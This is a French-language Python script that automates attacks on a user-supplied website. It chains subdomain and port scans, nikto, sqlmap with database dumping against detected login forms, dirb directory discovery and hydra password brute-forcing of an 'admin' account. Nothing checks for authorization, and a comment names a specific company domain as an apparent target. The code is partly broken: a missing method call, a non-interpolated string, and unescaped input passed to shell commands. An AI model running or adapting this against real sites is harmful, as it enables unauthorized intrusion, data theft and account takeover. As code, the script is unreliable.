import os
import subprocess
import re

site_web = input("Entrez l'URL du site web à pentester : ")
site_web_sanitize = site_web.replace("/", ".")
page_html = "index.html"
page_php = "index.php"
file_dir = "Includes/File_Dir_test.txt"
fichier_de_mot_de_passe = "Includes/password_test.txt"

# Effectuer un scan de reconnaissance initiale avec sublist3r, nmap et nikto
print(f"## Scan de reconnaissance initiale de {site_web}... ##")

if os.path.exists(f"Results/Scans/Sublist3r/{site_web_sanitize}/"):
	os.system(f"rm -r Results/Scans/Sublist3r/{site_web_sanitize}/")

if not os.path.exists("Results/"):
	os.makedirs("Results/")

if not os.path.exists("Results/Scans/"):
	os.makedirs("Results/Scans/")

if not os.path.exists("Results/Scans/Sublist3r/"):
	os.makedirs("Results/Scans/Sublist3r/")

if not os.path.exists(f"Results/Scans/Sublist3r/{site_web_sanitize}/"):
	os.makedirs(f"Results/Scans/Sublist3r/{site_web_sanitize}/")

print("  --Scan avec Sublist3r",f"	--Scan des sous-domaines de {site_web}...", sep="\n")
os.system(f"python3 Sublist3r/sublist3r.py -d {site_web} > Results/Scans/Sublist3r/{site_web_sanitize}/sublist3r_scan.txt")

if  os.path.exists(f"Results/Scans/Sublist3r/{site_web_sanitize}/sublist3r_scan1.txt"):
    os.system(f"rm Results/Scans/Sublist3r/{site_web_sanitize}/sublist3r_scan1.txt")

with open(f'Results/Scans/Sublist3r/{site_web_sanitize}/sublist3r_scan.txt', 'r') as f:
	content = f.readlines()

# Variable pour contrôler si l'écriture doit commencer
start_writing = False

with open(f'Results/Scans/Sublist3r/{site_web_sanitize}/sublist3r_scan1.txt', 'w') as f:
	for url in content:
    	# Vérifier si la ligne contient "www.sofratel.fr"
		if 'www.{site_web}' in url:
			start_writing = True
    	# Commencer à écrire seulement après avoir trouvé la ligne souhaitée
		if start_writing:
			url_modified = re.sub(r'^\[92m', '', url).strip
			url_remodified = re.sub(r'^\[0m', '', url_modified).strip()
			f.write(url_remodified + '\n')

os.system(f"rm Results/Scans/Sublist3r/{site_web_sanitize}/sublist3r_scan.txt")
print(f"	--Scan des sous-domaines de {site_web} terminé...", "  --Scan avec Sublist3r terminé." + "\n", sep="\n")

if os.path.exists(f"Results/Scans/Nmap/hostnames/{site_web_sanitize}/"):
	os.system(f"rm -r Results/Scans/Nmap/hostnames/{site_web_sanitize}/")

if os.path.exists(f"Results/Scans/Nmap/scan/{site_web_sanitize}/"):
	os.system(f"rm -r Results/Scans/Nmap/scan/{site_web_sanitize}/")

if os.path.exists(f"Results/Scans/Nmap/http-s/{site_web_sanitize}/"):
	os.system(f"rm -r Results/Scans/Nmap/http-s/{site_web_sanitize}/")

if not os.path.exists("Results/Scans/Nmap/"):
	os.makedirs("Results/Scans/Nmap/")

if not os.path.exists("Results/Scans/Nmap/hostnames/"):
	os.makedirs("Results/Scans/Nmap/hostnames/")

if not os.path.exists(f"Results/Scans/Nmap/hostnames/{site_web_sanitize}/"):
	os.makedirs(f"Results/Scans/Nmap/hostnames/{site_web_sanitize}/")

if not os.path.exists("Results/Scans/Nmap/scan/"):
	os.makedirs("Results/Scans/Nmap/scan/")

if not os.path.exists(f"Results/Scans/Nmap/scan/{site_web_sanitize}/"):
	os.makedirs(f"Results/Scans/Nmap/scan/{site_web_sanitize}/")

if not os.path.exists("Results/Scans/Nmap/http-s/"):
	os.makedirs("Results/Scans/Nmap/http-s/")

if not os.path.exists(f"Results/Scans/Nmap/http-s/{site_web_sanitize}/"):
	os.makedirs(f"Results/Scans/Nmap/http-s/{site_web_sanitize}/")

print("  --Scan avec Nmap...")
with open(f"Results/Scans/Sublist3r/{site_web_sanitize}/sublist3r_scan1.txt", "r") as f:
	urls = f.readlines()
for url in urls:
	url = url.strip()
	print(f"	--Scan avec Nmap de l'url {url}...")
	os.system(f"nmap {url} > Results/Scans/Nmap/scan/{site_web_sanitize}/nmap_results-{url}.txt")

	nmap_result = subprocess.check_output(["nmap", url])
	if "443/tcp" in nmap_result.decode("utf-8"):
		scheme = "https://"
		os.system(f"echo {scheme} > Results/Scans/Nmap/http-s/{site_web_sanitize}/nmap_http-s-{url}.txt")
	else:
		scheme = "http://"
		os.system(f"echo {scheme} > Results/Scans/Nmap/http-s/{site_web_sanitize}/nmap_http-s-{url}.txt")
	print(f"	--Scan avec Nmap de l'url {url} terminé." + "\n")
print("  --Scan avec Nmap terminé." + "\n")

print("**Suppression des fichiers Nmap dont le scan n'a pas donné de résultats**")
for filename in os.listdir(f"Results/Scans/Nmap/scan/{site_web_sanitize}/"):
	filepath = os.path.join(f"Results/Scans/Nmap/scan/{site_web_sanitize}/", filename)
	if os.path.isfile(filepath):
		with open(filepath, "r") as f:
			if "0 IP addresses" in f.read():
				name = filename.replace("nmap_results-", "").replace(".txt", "")
				http_file = os.path.join(f"Results/Scans/Nmap/http-s/{site_web_sanitize}/", "nmap_http-s-" + name + ".txt")
				if os.path.isfile(http_file):
					os.remove(http_file)
				os.remove(filepath)
hostnames = set()
for filename in os.listdir(f"Results/Scans/Nmap/scan/{site_web_sanitize}/"):
	filepath = os.path.join(f"Results/Scans/Nmap/scan/{site_web_sanitize}/", filename)
	if os.path.isfile(filepath):
		with open(filepath, "r") as f:
			name = filename.replace("nmap_results-", "").replace(".txt", "")
			hostnames.add(name)
with open(f"Results/Scans/Nmap/hostnames/{site_web_sanitize}/hostnames.txt", "w") as f:
	for hostname in hostnames:
		if 'www' not in hostname:
			f.write(f"{hostname}\n")
print("**Suppression des fichiers Nmap dont le scan n'a pas donné de résultats terminé.**" + "\n")

if os.path.exists(f"Results/Scans/Nikto/{site_web_sanitize}/"):
	os.system(f"rm -r Results/Scans/Nikto/{site_web_sanitize}/")

if not os.path.exists("Results/Scans/Nikto/"):
	os.makedirs("Results/Scans/Nikto/")

if not os.path.exists(f"Results/Scans/Nikto/{site_web_sanitize}/"):
	os.makedirs(f"Results/Scans/Nikto/{site_web_sanitize}/")

print("  --Scan avec Nikto...")
with open(f"Results/Scans/Nmap/hostnames/{site_web_sanitize}/hostnames.txt", "r") as f:
	domains = f.read().splitlines()

for domain in domains:
	with open(f"Results/Scans/Nmap/http-s/{site_web_sanitize}/nmap_http-s-{domain}.txt", "r") as f:
		scheme1 = f.read().strip()
	print(f"	--Scan avec Nikto de {scheme1}{domain}...")
	os.system(f"nikto -h {scheme1}{domain} -T 180 > Results/Scans/Nikto/{site_web_sanitize}/nikto_scan_{domain}.txt")
	print(f"	--Scan avec Nikto de {domain} terminé.")
print("  --Scan avec Nikto terminé.")
print("## Scan de reconnaissance initiale terminé ! ##" + "\n")

print("-----------------------------------" + "\n")

if os.path.exists(f"txt/pages/{site_web_sanitize}/"):
	os.system(f"rm -r txt/pages/{site_web_sanitize}/")

if not os.path.exists("txt/pages/"):
	os.makedirs("txt/pages/")

if not os.path.exists(f"txt/pages/{site_web_sanitize}/"):
	os.makedirs(f"txt/pages/{site_web_sanitize}/")

print("## Définition des différentes pages 'index.html' et 'index.php'... ##" + "\n")
with open(f"Results/Scans/Nmap/hostnames/{site_web_sanitize}/hostnames.txt", "r") as f:
	for line in f:
		line = line.strip()
		if line:
			domain = line
			scheme = ""
			if os.path.exists(f"Results/Scans/Nmap/http-s/{site_web_sanitize}/nmap_http-s-{domain}.txt"):
				with open(f"Results/Scans/Nmap/http-s/{site_web_sanitize}/nmap_http-s-{domain}.txt", "r") as f2:
					scheme = f2.read().strip()

			if scheme:
				print(f"  --Définition de la page 'index.html' de {domain}... ##" + "\n")
				url1 = scheme + domain
				if os.system(f"wget -qO- {url1}/index.html | grep --quiet '<html'") == 0:
					os.system(f"touch txt/pages/{site_web_sanitize}/pages_html_{site_web_sanitize}.txt")
					with open(f"txt/pages/{site_web_sanitize}/pages_html_{site_web_sanitize}1.txt", "a") as f:
						f.write(f"{url1}/index.html\n")
					with open(f"txt/pages/{site_web_sanitize}/pages_html_{site_web_sanitize}1.txt", 'r') as input_file, open(f"txt/pages/{site_web_sanitize}/pages_html_{site_web_sanitize}.txt", 'w') as output_file:
						for line in input_file:
							url1 = line.strip()
							output_file.write(url1 + '\n')
				print(f"  --Définition de la page 'index.html' de {domain} terminée ! ##" + "\n")
				
				print(f"  --Définition de la page 'index.php' de {domain}... ##" + "\n")
				url1 = scheme + domain
				if os.system(f"wget -qO- {url1}/index.php | grep --quiet '<html'") == 0:
					os.system(f"touch txt/pages/{site_web_sanitize}/pages_php_{site_web_sanitize}.txt")
					with open(f"txt/pages/{site_web_sanitize}/pages_php_{site_web_sanitize}1.txt", "a") as f:
						f.write(f"{url1}/index.php\n")
					with open(f"txt/pages/{site_web_sanitize}/pages_php_{site_web_sanitize}1.txt", 'r') as input_file, open(f"txt/pages/{site_web_sanitize}/pages_php_{site_web_sanitize}.txt", 'w') as output_file:
						for line in input_file:
							url1 = line.strip()
							output_file.write(url1 + '\n')
				print(f"  --Définition de la page 'index.php' de {domain} terminée ! ##" + "\n")

if os.path.exists(f"txt/pages/{site_web_sanitize}/pages_html_{site_web_sanitize}1.txt"):
	os.system(f"rm txt/pages/{site_web_sanitize}/pages_html_{site_web_sanitize}1.txt")

if os.path.exists(f"txt/pages/{site_web_sanitize}/pages_php_{site_web_sanitize}1.txt"):
	os.system(f"rm txt/pages/{site_web_sanitize}/pages_php_{site_web_sanitize}1.txt")

print("## Définition des différentes pages 'index.html' et 'index.php' terminée ! ##" + "\n")

if not os.path.exists(f"txt/pages/{site_web_sanitize}/html/"):
	os.makedirs(f"txt/pages/{site_web_sanitize}/html/")

if not os.path.exists(f"txt/pages/{site_web_sanitize}/php/"):
	os.makedirs(f"txt/pages/{site_web_sanitize}/php/")

print("## Détection de formulaires d'authentification... ##" + "\n")
# Vérifier dans les pages enregistrées dans txt/pages/index_html.txt

if os.path.exists(f"txt/pages/{site_web_sanitize}/html/a-auth_{site_web_sanitize}.txt"):
        	os.system(f"rm txt/pages/{site_web_sanitize}/html/a-auth_{site_web_sanitize}.txt")

with open(f"txt/pages/{site_web_sanitize}/pages_html_{site_web_sanitize}.txt", "r") as f:
	pages5 = f.readlines()
	for page5 in pages5:
		page5 = page5.strip()
		page5_sanitize = page5.replace("://", ".").replace("/", ".")
		process = os.system(f"wget {page5} -O - | grep '<form name=\"auth\"'")
		os.system(f"touch txt/pages/{site_web_sanitize}/html/a-auth_{site_web_sanitize}.txt")
		if process == 0:  # Si grep trouve le formulaire
        	# Enregistrement du contenu
			os.system(f"wget {page5}")
			if os.path.exists("index.html"):
				os.system(f"cp index.html txt/pages/{site_web_sanitize}/html/index_{page5}")
				os.system("rm index.html")
			if os.path.exists("index.html.1"):
				os.system("rm index.html.1")
			with open(f"txt/pages/{site_web_sanitize}/html/a-auth_{site_web_sanitize}.txt", "a") as f:
				f.write(f"{page5}\n")

# Vérifier dans les pages enregistrées dans txt/pages/index_php.txt

if os.path.exists(f"txt/pages/{site_web_sanitize}/php/a-auth_{site_web_sanitize}.txt"):
        	os.system(f"rm txt/pages/{site_web_sanitize}/php/a-auth_{site_web_sanitize}.txt")

with open(f"txt/pages/{site_web_sanitize}/pages_php_{site_web_sanitize}.txt", "r") as f:
	pages6 = f.readlines()
	for page6 in pages6:
		page6 = page6.strip()
		page6_sanitize = page6.replace("://", ".").replace("/", ".")
		process = os.system(f"wget {page6} -O - | grep '<form name=\"auth\"'")
		os.system(f"touch txt/pages/{site_web_sanitize}/php/a-auth_{site_web_sanitize}.txt")
		if process == 0:  # Si grep trouve le formulaire
        	# Enregistrement du contenu
			os.system(f"wget {page6}")
			if os.path.exists("index.php"):
				os.system(f"cp index.php txt/pages/{site_web_sanitize}/php/index_{page6_sanitize}")
				os.system("rm index.php")
			if os.path.exists("index.php.1"):
				os.system("rm index.php.1")
			with open(f"txt/pages/{site_web_sanitize}/php/a-auth_{site_web_sanitize}.txt", "a") as f:
				f.write(f"{page6}\n")
print("## Détection de formulaires d'authentification terminée ! ##" + "\n")

print("-----------------------------------" + "\n")

if os.path.exists(f"Results/SQL_Injections/{site_web_sanitize}/"):
	os.system(f"rm -r Results/SQL_Injections/{site_web_sanitize}/")

if not os.path.exists("Results/SQL_Injections/"):
	os.makedirs("Results/SQL_Injections/")

if not os.path.exists(f"Results/SQL_Injections/{site_web_sanitize}/"):
	os.makedirs(f"Results/SQL_Injections/{site_web_sanitize}/")

print(f"## Test d'injections SQL sur un formulaire d'authentification... ##")
with open(f"txt/pages/{site_web_sanitize}/html/a-auth_{site_web_sanitize}.txt", "r") as f:
	pages1 = f.readlines()
for page1 in pages1:
	page1 = page1.strip()
	page_sanitize1 = page1.replace("/", ".")
	print(f"  --Test d'injections SQL **HTML** sur la page {page1}...")
	os.system(f"sqlmap -u {page1} --data='Utilisateur=admin&Mot_de_passe=admin' --dbms=MySQL --threads 4 --union-cols=1-10 --batch --dump > Results/SQL_Injections/{site_web_sanitize}/sqlmap_results-{page_sanitize1}.txt")
	print(f"  --Test d'injections SQL **HTML** terminé sur la page {page1}." + "\n")

with open(f"txt/pages/{site_web_sanitize}/php/a-auth_{site_web_sanitize}.txt", "r") as f:
	pages2 = f.readlines()
for page2 in pages2:
	page2 = page2.strip()
	page_sanitize2 = page2.replace("/", ".")
	print(f"  --Test d'injections SQL **PHP** sur la page {page2}...")
	os.system(f"sqlmap -o -u {page2} --data='login=admin&mdp=admin' --dbms=MySQL --threads 4 --union-cols=1-10 --batch --dump > Results/SQL_Injections/{site_web_sanitize}/sqlmap_results-{page_sanitize2}.txt")
	print(f"  --Test d'injections SQL **PHP** terminé sur la page {page2}." + "\n")
print("## Test d'injections SQL sur un formulaire d'authentification terminé ! ##" + "\n")

print("-----------------------------------" + "\n")

# Recherche de répertoires cachés avec dirb

if os.path.exists(f"Results/Hidden_Files/{site_web_sanitize}/"):
	os.system(f"rm -r Results/Hidden_Files/{site_web_sanitize}/")

if not os.path.exists("Results/Hidden_Files/"):
	os.makedirs("Results/Hidden_Files/")

if not os.path.exists(f"Results/Hidden_Files/{site_web_sanitize}/"):
	os.makedirs(f"Results/Hidden_Files/{site_web_sanitize}/")

print("## Recherche de répertoires cachés... ##")
os.system(f"dirb {scheme}{site_web} {file_dir} > Results/Hidden_Files/{site_web_sanitize}/dirb_results.txt")
print("## Recherche de répertoires cachés terminée ! ##" + "\n")

print("-----------------------------------" + "\n")

if os.path.exists(f"Results/Brute_Force/{site_web_sanitize}/"):
	os.system(f"rm -r Results/Brute_Force/{site_web_sanitize}/")

if not os.path.exists("Results/Brute_Force/"):
	os.makedirs("Results/Brute_Force/")

if not os.path.exists(f"Results/Brute_Force/{site_web_sanitize}/"):
	os.makedirs(f"Results/Brute_Force/{site_web_sanitize}/")

# Test de brute force contre les mots de passe avec hydra
print("## Test de brute force des mots de passe... ##")
with open(f"txt/pages/{site_web_sanitize}/html/a-auth_{site_web_sanitize}.txt", "r") as f:
	pages3 = f.readlines()
for page3 in pages3:
	page3 = page3.strip()
	page_sanitize3 = page3.replace("/", ".")
	page_noindex1 = re.sub(r'^http[s]?://', '', page3).replace("/index.html", "")
	print(f"  --Test de brute force des mots de passe **HTML** sur la page {page3}...")
	os.system(f'hydra {page_noindex1} -l admin -P {fichier_de_mot_de_passe} http-post-form "/index.html:Utilisateur=^USER^&mdp=^PASS^:F=Autorisation requise"> Results/Brute_Force/{site_web_sanitize}/hydra_results-{page_sanitize3}.txt')
	print(f"  --Test de brute force des mots de passe **HTML** terminé sur la page {page3} !" + "\n")
    
with open(f"txt/pages/{site_web_sanitize}/php/a-auth_{site_web_sanitize}.txt", "r") as f:
	pages4 = f.readlines()
for page4 in pages4:
	page4 = page4.strip()
	page_sanitize4 = page4.replace("/", ".")
	page_noindex2 = re.sub(r'^http[s]?://', '', page4).replace("/index.php", "")
	print(f" --Test de brute force des mots de passe **PHP** sur la page {page4}... ##")
	os.system(f'hydra {page_noindex2} -l admin -P {fichier_de_mot_de_passe} http-post-form "/index.php:Utilisateur=^USER^&mdp=^PASS^:F=Le couple nom d\'utilisateur et mot de passe est incorrecte." > Results/Brute_Force/{site_web_sanitize}/hydra_results-{page_sanitize4}.txt')
	print(f"  --Test de brute force des mots de passe **PHP** terminé sur la page {page4} ! ##" + "\n")
print("## Test de brute force des mots de passe terminé ! ##")